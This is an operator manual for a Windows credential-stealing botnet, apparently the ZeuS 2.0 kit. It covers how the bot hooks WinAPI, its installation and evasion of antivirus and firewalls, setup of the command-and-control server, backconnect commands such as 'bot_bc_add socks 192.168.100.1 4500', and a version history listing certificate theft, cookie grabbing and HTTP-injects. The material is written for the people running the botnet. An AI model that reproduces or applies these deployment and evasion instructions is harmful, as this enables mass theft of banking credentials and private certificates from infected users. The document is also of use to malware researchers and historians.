<h2 id="description_bot">Description: Bot</h2>
<ul>
  <li>
    <p><b>Language and IDE programming:</b></p>
    <p>Visual C++ (current version 9.0). No additional libraries are used (crtl, mfc, etc.).</p>
  </li>
  <li>
    <p><b>Supported OS:</b></p>
    <p>XP/Vista/Seven, as well as 2003/2003R2/2008/2008R2. Included work under Windows x64, but only for 32-x bits processes. Also retained full bot work under active "Terminal Servers" sessions.</p>
  </li>
  <li>
    <p><b>Action principle:</b></p>
    <p>Bot is based on intercepting WinAPI, by splicing in ring3 (user mode), by running a copy of its code in each process of the user (without using DLL).</p>
  </li>
  <li>
    <p><b>Installation process:</b></p>
    <p>At the moment, the bot is primarily designed to work under Vista/Seven, with enabled UAC, and without the use of local exploits. Therefore the bot is designed to work with minimal privileges (including the user "Guest"), in this regard the bot is always working within sessions per user (from under which you install the bot.). Bot can be set for each use in the OS, while the bots will not know about eachother. When you run the bot as "LocalSystem" user it will attempt to infect all users in the system.</p>
    <p>When you install, bot creates its copy in the user's home directory, this copy is tied to the current user and OS, and cannot be run by another user, or even more OS. The original copy of the same bot (used for installation), will be automatically deleted, regardless of the installation success.</p>
  </li>
  <li>
    <p><b>The session with the server (control panel):</b></p>
    <p>Session with the server through a variety of processes from an internal "white list" that allows you to bypass most firewalls. During the session, the bot can get the configuration to send the accumulated reports, report their condition to the server and receive commands to execute on the computer. The session takes place via HTTP-protocol, all data sent by a bot and received from the server is encrypted with a unique key for each botnet.</p>    
  </li>
  <li>
    <p><b>Protection:</b></p>
    <ol>
      <li>Unique names of all objects (files, MUTEXes, registry keys) when creating a bot for every user and a botnet.</li>
      <li>Fixed bot can not be run with a different operating system or user. Destroys the code that is used to install the bot.</li>
      <li>At the moment not done to hide bot files through WinAPI, because anti-virus tools are very easy to find such a file, and allow to pinpoint the location of the bot.</li>
      <li>Autoupdate bot, do not require a reboot.</li>
      <li>Monitoring the integrity of files the bot.</li>
    </ol>
  </li>
  <li>
    <p><b>Server-side bot functions:</b></p>
    <ol>
      <li>Socks 4/4a/5 server with support for UDP and IPv6.</li>
      <li>Backconnect for any service (RDP, Socks, FTP, etc.) on the infected machine. I.e. may gain access to a computer that is behind a NAT, or, for example, which has prohibited connections by a firewall. For this feature to work there are used additional applications that run on any Windows-server on the Internet, which has a dedicated IP.</li>

<h2 id="cp_server">Control panel: Server configuration</h2>
<p>The server is the central point of control the botnet, it is engaged in collecting reports of bots and command bots. It is not recommended to use "Virtual Hosting" or "VDS", as with an increase in the botnet, the server will increase, and this kind of web hosting quickly exhaust its resources. You need a "Dedicated Server" (Ded), the recommended minimum configuration:</p>
<ul>
  <li>2Gb RAM.</li>
  <li>2x 2GHz processor speed.</li>
  <li>Separate hard drive for the database.</li>
</ul>
<p>For bot to work requires HTTP-server with PHP + Zend Optimizer attached, and MySQL-server.<br/><b>WARNING:</b> For Windows-based servers is very important to change (create) the following registry value: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\MaxUserPort=dword:65534 (decimal).</p>
<ul>
  <li>
    <p><b>HTTP-server:</b></p>
    <p>As an HTTP-server is recommended to use: for nix-system - Apache from version 2.2, for Windows-servers - IIS from version 6.0. It is recommended to keep the HTTP-server on port 80 or 443 (a positive effect on bot run, as providers/proxy can block access to some non-standard ports).</p>
    <p>Download Apache: <a href="http://apache.org/dyn/closer.cgi">http://apache.org/dyn/closer.cgi</a>.<br/>IIS website: <a href="http://www.iis.net/">http://www.iis.net/</a>.</p>
  </li>
  <li>
    <p><b>PHP interpreter:</b></p>
    <p>The latest version of the control panel was developed on PHP 5.2.6. Therefore, it is highly recommended to use version, at least this version.</p>
    <p>It is important to make the following settings php.ini:</p>
    <ul>
      <li>safe_mode = Off</li>
      <li>magic_quotes_gpc = Off</li>
      <li>magic_quotes_runtime = Off</li>
      <li>memory_limit = 256M  ;Or higher.</li>
      <li>post_max_size = 100M ;Or higher.</li>
    </ul>
    <p>and also recommended that you change these settings:</p>
    <ul>
      <li>display_errors = Off</li>
    </ul>
    <p>Also need to enable the Zend Optimizer (acceleration of the script, and run protected scripts). Recommended version from 3.3.</p>
    <p>Not recommended to connect PHP to the HTTP-server via CGI.</p>
    <p>Download PHP: <a href="http://www.php.net/downloads.php">http://www.php.net/downloads.php</a>.<br/>Download Zend Optimizer: <a href="http://www.zend.com/en/products/guard/downloads">http://www.zend.com/en/products/guard/downloads</a>.</p>    
  </li>
  <li>
    <p><b>MySQL-server:</b></p>
    <p>MySQL is required to store all data about the botnet. The recommended version is not below 5.1.30, well worth considering, that when ran the control panel in the older versions were detected some problems. All table control panel, go to format MyISAM, it is important to optimize speed of work with this format, based on the available server resources.</p>
    <p>Recommended the following changes to the settings MySQL-server (my OR my.ini):</p>
    <ul>
      <li>max_connections=2000 #Or higher</li>
    </ul>
    <p>Download MySQL: <a href="http://dev.mysql.com/downloads/">http://dev.mysql.com/downloads/</a>.</p>

<p>The control panel is usually located in your distribution folder server[php]. All contents of this folder is for upload to the server in any location accessible via HTTP. If you upload it via FTP, all files must be uploaded in BINARY mode.</p>
<p>For nix-systems set rights:</p>
<table class="list">
  <tr><td>/.</td><td>777</td></tr>
  <tr><td>/system</td><td>777</td></tr>

  <tr><td>\tmp</td><td>as well as for \system</td></tr>

<p>Once all files are uploaded and are set the rights, need to run in the browser the installer from URL http://server/directory/install/index.php. Follow the on-screen instructions, in case of errors (You will be notified in detail) in the installation process, check the entered data, and proper rights setting to the folder.</p>
<p>After installing, is recommended to remove the install directory, and rename files cp.php (control panel entrance) and gate.php (gate for bots) to any files you like (the extension cannot be changed).</p>
<p>Now you can safely enter into the control panel by typing in the browser URL the renamed file cp.php.</p>

<h2 id="bc">Working with the Backonnect-server</h2>
<p>Working with the BackConnect with example.</p>
<ul>
  <li>Backconnect-server IP-address: 192.168.100.1.</li>
  <li>Port for bot: 4500.</li>
  <li>Port for the client application: 1080.</li>
  <li>Bot service: socks.</li>  
</ul>
<ol>
  <li><p>Run a server application (zsbcs.exe or zsbcs64.exe) on the server having its own IP-address on the Internet, for application indicated port, which waits for a connection from a bot, and the port which will connect the client application. For example zsbcs.exe listen -cp:1080 -bp:4500, where 1080 - client port, 4500 - port for the bot.</p></li>
  <li><p>Necessary to send command to bot "<a href="#bot_bc_add">bot_bc_add</a> socks 192.168.100.1 4500".</p></li>
  <li><p>Now you need to wait for a connection from the bot to the server, in this period, any attempt to connect the client application will be ignored (will take disconnect from the client). The sign of the connected bot will be output to the console server line "Accepted new conection from bot...".</p></li>
  <li><p>After connecting the bot, you can work with your client application. I.e. You simply connect to the server to the client port (in this case 1080). For example, if you are giving socks commands, then on the client port you would expect Socks-server.</p></li>
  <li><p>After that, when you do not need Backconnect from the bot for a specific service, should issue the command "<a href="#bot_bc_remove">bot_bc_remove</a> socks 192.168.100.1 4500".</p></li>
</ol>
<p><b>NOTES:</b></p>
<ol>
  <li>You can specify any number of Backconnects (i.e. bot_bc_add), but they should not be a common combination of IP + Port. But if there is such a combination, will run the first added.</li>
  <li>For each Backconnect, you must run a separate server application.</li>
  <li>In case of disconnection (server down, drop bot, etc.), the bot will reconnect to the server indefinitely (even after restarting PC), until Backconnect will not be removed (i.e. bot_bc_remove).</li>
  <li>As a service for bot_bc_add, you can use any open port at the address 127.0.0.1.</li>
  <li>Server application supports IPv6, but currently this support is not particularly relevant.</li>
  <li>You can launch the server application under Wine. Writing the same elf application is not currently scheduled.</li>
  <li>It is highly recommended to use for the bp server application popular ports (80, 8080, 443 etc.), i.e. other ports may be blocked by the provider that owns the bot.</li>
  <li>Not to be allowed to subscribe different bots on one and the same server port at the same time.</li>
  <li>The method of such a connection might be useful for bots, which are outside the NAT, i.e. sometimes WIndows firewall of providers, may block the Internet connection.</li>

<ul>
  <li>
    <p><b>What do the numbers in the version?</b></p>
    <p>Format version <b>a</b>.<b>b</b>.<b>c</b>.<b>d</b>, where:</p>
    <ul>
      <li><b>a</b> - a complete change in the bot device.</li>
      <li><b>b</b> - major changes, that cause complete or partial incompatibility with previous versions.</li>
      <li><b>c</b> - bug fixes, improvements, adding features.</li>
      <li><b>d</b> - cleaning issue from antivirus for the current version a.b.c.</li>
    </ul>
  </li>
  <li>
    <p><b>How is generated Bot ID?</b></p>
    <p>Bot ID consists of two parts: %name%_%number%, where name - computer name (result of GetComputerNameW), a number - a certain number, generated based on some unique OS data.</p>
  </li>
  <li>
    <p><b>Why traffic is encrypted with symmetric encryption method (RC4), but not asymmetric (RSA)?</b></p>
    <p>Because, in the use of sophisticated algorithms it makes no sense, encryption only needs to hide traffic. Plus in the RSA only, not knowing the key that is in the Control panel, will not be able to emulate its answers. And what's the point to defend against this?</p>

<h2 id="history">Version history</h2>
<ul>
  <li><p><b>Version 2.0.0.0, 01.04.2010</b></p><ol>
    <li>Full compatible with previous versions.</li>
    <li>Since the core of the bot is aimed at Windows Vista+, and the bot will never use privilege escalation, etc., bot is working within a single user. But the basic attempts to infect other Windows users are made (usually effective in cases of disabling UAC, or run from under LocalSystem).</li>
    <li>Arbitrary file names, mutexes, etc.</li>
    <li>Completely rewritten bot core, the installation process in the system to send reports to the Control panel.</li>
    <li>At installation, the bot recrypts his body, thus preserves a unique copy of the exe-file on each computer.</li>
    <li>Binding bot to computer by modifying/deleting some data in the exe-file.</li>
    <li>Valuable work with x32 applications in Windows x64.</li>
    <li>Delete the original bot file, after execution, regardless of the outcome of performance.</li>
    <li>Valuable work in parallel sessions for "Terminal Services".</li>
    <li>When run as the LocalSystem user, an attempt is made to infect all system users.</li>
    <li>Removed the option "StaticConfig.blacklist_languages".</li>
    <li>The name of the botnet is limited to 20 characters and can contain any international characters.</li>
    <li>The configuration file is read in UTF-8 encoding.</li>
    <li>Removed the option "StaticConfig.url_compip".</li>
    <li>A new method for determining the NAT.</li>
    <li>You can not upgrade a new version of the bot on an old one.</li>
    <li>When updating bot is a complete update immediately, without waiting for a reboot.</li>
    <li>At the moment, due to some reasons, hide bot files will not run at all.</li>
    <li>Removed "Protected Storage" grabber, because starting with IE7, it is no longer used.</li>
    <li>With regard to the unreliability of the old system of counting "Installs" the bot is counted automatically as "Install" when added to database.</li>
    <li>A new way to get IE cookies.</li>
    <li>Improved back-connect protocol.</li>
    <li>Because the "light-mode" builder is designed to test and debug HTTP-injects and HTTP-fakes, it has some limitations on assembly of the configuration file.</li>
    <li>Complicated to discover the bot traffic.</li>
    <li>Complete (as with wininet.dll) to work with nspr4.dll, but without HTTP-fakes.</li>
  </ol></li>

  <li><p><b>Version 2.0.1.0, 28.04.2010</b></p>Now using an external crypter, with respect to these canceled some features of the previous version:<ol>
    <li>Modified to bind to the user/OS.</li>
    <li>Bot is no longer able to recrypt itself during installation.</li>
    <li>Minor improvements to HTTP-injects.</li>
  </ol></li>

  <li><p><b>Version 2.0.2.0, 10.05.2010</b></p><ol>
    <li>Forced change of Mozilla Firefox security settings for normal HTTP-injects.</li>
    <li>Command "user_homepage_set" uses home page is mandatory for IE and Firefox (i.e. the page will be restored even if the user makes a change) as long as no command is canceled.</li>
  </ol></li>

  <li><p><b>Version 2.0.3.0, 19.05.2010</b></p><ol>
    <li>With regard to the fact that HTTP-injects are mostly written by people who understand little of HTTP, HTML, etc., removed warning "*NO MATCHES FOUND FOR CURRENT MASK*". Because due to abuse of the mark "*" masked URL, this warning appears very often.</li>
  </ol></li>

  <li><p><b>Version 2.0.4.0, 31.05.2010</b></p><ol>
    <li>In control panel, fixed a bug in the module "Botnet-> Bots", which does not allow to search by IP.</li>
    <li>In the configuration file, added the option "StaticConfig.remove_certs", to disable the automatic deletion of certificates from the user store when install the bot.</li>
    <li>In the configuration file, added the option "StaticConfig.disable_tcpserver", which allows you to disable the TCP-server (DISABLE: socks-server, screenshots in real time). This option is introduced to prevent warnings from the "Windows Firewall".</li>
    <li>Ripped certificates stored on the server with an indication of the user, from which they are received.</li>
  </ol></li>

  <li><p><b>Version 2.0.5.0, 08.06.2010</b></p><ol>

    <li>Fixed minor bugs in HTTP-grabber.</li>
  </ol></li>

  <li><p><b>Version 2.0.6.0, 22.06.2010</b></p><ol>
    <li>In nspr4.dll, in a particular format of the HTTP-response from server, this reply was not analyzed correctly (resulting, for example, in disabling the HTTP-injects).</li>
  </ol></li>

  <li><p><b>Version 2.0.7.0, 15.07.2010</b></p><ol>
    <li>Disable the built-in bot encryption.</li>
